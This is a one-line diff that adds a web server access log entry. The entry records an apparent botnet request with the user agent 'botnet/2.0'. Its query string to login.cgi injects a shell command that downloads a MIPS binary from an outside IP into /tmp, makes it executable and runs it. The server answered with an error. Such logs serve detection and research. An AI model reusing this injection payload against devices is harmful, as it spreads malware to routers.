@@ -1,0 +1,1 @@
+177.105.255.226 - - [09/Mar/2020:22:45:39 +0200] "GET /login.cgi?cli=aa%20aa%27;wget%20http://45.148.10.194/mips%20-O%20->%20/tmp/leonn;chmod%20777%20/tmp/leonn;/tmp/leonn%20dlink.mips%27$ HTTP/1.1" 400 150 "-" "-" "botnet/2.0"
